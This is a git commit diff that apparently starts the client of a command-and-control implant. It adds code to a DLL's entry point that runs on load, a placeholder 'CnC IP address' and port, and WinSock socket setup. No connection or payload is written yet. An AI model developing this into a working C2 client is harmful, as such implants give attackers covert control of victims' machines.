64c04116f459356767fa3e279b5b0273dd73368e
Preciado <aarongarpre@gmail.com>
2023-07-06 23:53:32 +0200

    WinSock initialized

--- client/src/dllmain.cpp
+++ client/src/dllmain.cpp
@@ -8,6 +8,10 @@
 #include <WS2tcpip.h>
 
 void DebugMode();
+void Main();
+
+#define IP_ADDR "127.0.0.1" // Change this to your CnC IP address
+#define PORT 5000 // Change this to your CnC Port
 
 BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpvReserved) {
 	switch (dwReason) {
@@ -15,9 +19,24 @@ BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpvReserved) {
 #ifndef NDEBUG
 		DebugMode();
 #endif
+		Main();
 		break;
 	}
 	return TRUE;
+}
+
+void Main() {
+	WSADATA wsa;
+	WSAStartup(MAKEWORD(2, 2), &wsa);
+
+	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (sock == INVALID_SOCKET) {
+		std::cout << "[ERROR] Error initializing our socket" << std::endl;;
+		throw std::exception();
+		return;
+	}
+
+	
 }
 
 void DebugMode() {
